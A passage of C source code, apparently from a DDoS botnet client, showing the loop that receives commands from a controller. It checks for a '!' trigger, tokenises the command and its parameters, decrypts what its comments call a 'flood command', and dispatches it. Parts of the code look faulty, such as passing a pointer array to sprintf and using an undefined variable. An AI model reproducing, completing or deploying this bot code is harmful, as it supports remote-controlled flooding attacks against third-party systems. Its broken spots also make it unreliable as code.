                for(on = 0; on < numpids; on++) newpids[on] = pids[on];
                free(pids);
                pids = newpids;
            }
            //Null Terminate The Buffer
            commBuf[got] = 0x00;
            //Trim And Parse
            trim(commBuf);
            unsigned char *message = commBuf;
            if(*message == '!'){ //Check For Trigger
                unsigned char *nickMask = message + 1;
                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++; //Get The Next Argument In The Buffer, Following The First 'Space'
                if(*nickMask == 0x00) continue;
                *(nickMask) = 0x00;
                nickMask = message + 1;

                message = message + strlen(nickMask) + 2; //Check That Next Character Doesn't Contain A New Line Or Return Character
                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                unsigned char *command = message;
                while(*message != ' ' && *message != 0x00) message++; //Pass The Next Argument
                *message = 0x00; //Null Terimate The Message
                message++;

                unsigned char *tmpcommand = command;
                while(*tmpcommand){ *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                unsigned char *params[10];
                int paramsCount = 1;
                unsigned char *pch = strtok(message, " "); //Space Token In String
                params[0] = command;

                while(pch){
                    if(*pch != '\n'){ //Not Equal To \newline
                        params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                        memset(params[paramsCount], 0, strlen(pch) + 1);
                        strcpy(params[paramsCount], pch);
                        paramsCount++;
                    }
                    pch = strtok(NULL, " ");
                }
                char fcmd[100];
                sprintf(fcmd, "%s", params); //Store Trimmed Encrypted Flood Command
                fwitch(fcmd); //Decrypt
                processCmd(paramsCount, dec_fargs); //Parse Parameters

                if(paramsCount > 1){ //Reset Char Memory
                    int q = 1;
                    for(q = 1; q < paramsCount; q++) free(params[q]);
                }
            }
            else continue; //Message Did Not Contain The Trigger
        }
    }
    return 0;
}
//Ass Cheeks